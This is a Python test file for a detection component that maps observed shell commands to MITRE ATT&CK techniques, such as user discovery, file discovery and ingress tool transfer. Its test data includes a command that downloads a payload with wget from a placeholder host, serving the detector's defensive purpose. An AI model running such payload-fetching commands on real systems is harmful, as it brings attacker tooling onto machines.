from intelligence.mitre.mapper import MitreMapper


def test_user_discovery_mapping():
    mapper = MitreMapper()

    techniques = mapper.map_commands(
        ["whoami"]
    )

    assert len(techniques) == 1
    assert techniques[0].technique_id == "T1033"
    assert techniques[0].technique_name == "System Owner/User Discovery"
    assert techniques[0].tactic == "Discovery"
    assert techniques[0].evidence == ["whoami"]


def test_file_discovery_mapping():
    mapper = MitreMapper()

    techniques = mapper.map_commands(
        ["ls", "pwd", "ls home"]
    )

    assert len(techniques) == 1
    assert techniques[0].technique_id == "T1083"
    assert techniques[0].technique_name == "File and Directory Discovery"
    assert techniques[0].evidence == ["ls", "pwd", "ls home"]


def test_payload_transfer_mapping():
    mapper = MitreMapper()

    techniques = mapper.map_commands(
        ["wget http://example.com/payload"]
    )

    assert len(techniques) == 1
    assert techniques[0].technique_id == "T1105"
    assert techniques[0].technique_name == "Ingress Tool Transfer"


def test_multiple_techniques():
    mapper = MitreMapper()

    techniques = mapper.map_commands(
        ["whoami", "ls", "wget http://example.com/file"]
    )

    technique_ids = {
        technique.technique_id
        for technique in techniques
    }

    assert technique_ids == {"T1033", "T1083", "T1105"}


def test_duplicate_commands_are_grouped():
    mapper = MitreMapper()

    techniques = mapper.map_commands(
        ["ls", "ls", "pwd"]
    )

    assert len(techniques) == 1
    assert techniques[0].technique_id == "T1083"
    assert techniques[0].evidence == ["ls", "pwd"]


def test_unknown_commands_return_no_mapping():
    mapper = MitreMapper()

    techniques = mapper.map_commands(
        ["echo hello", "exit"]
    )

    assert techniques == []
